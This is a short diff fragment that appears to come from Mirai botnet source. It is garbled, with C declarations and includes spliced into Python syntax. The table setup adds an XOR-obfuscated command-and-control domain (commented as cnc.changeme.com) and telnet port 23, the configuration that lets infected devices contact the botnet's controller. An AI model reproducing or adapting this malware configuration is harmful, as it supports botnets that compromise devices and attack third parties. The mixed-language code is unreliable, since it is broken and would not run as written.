@@ -8,8 +8,9 @@ import sys
 #include "util.h"
 
 table_key = 0xdeadbeef
-struct table_value table[TABLE_MAX_KEYS]
+# struct table_value table[TABLE_MAX_KEYS]
 
+table_value(table[TABLE_MAX_KEYS])
 def table_init():
     add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30) # cnc.changeme.com
     add_entry(TABLE_CNC_PORT, "\x22\x35", 2)   # 23
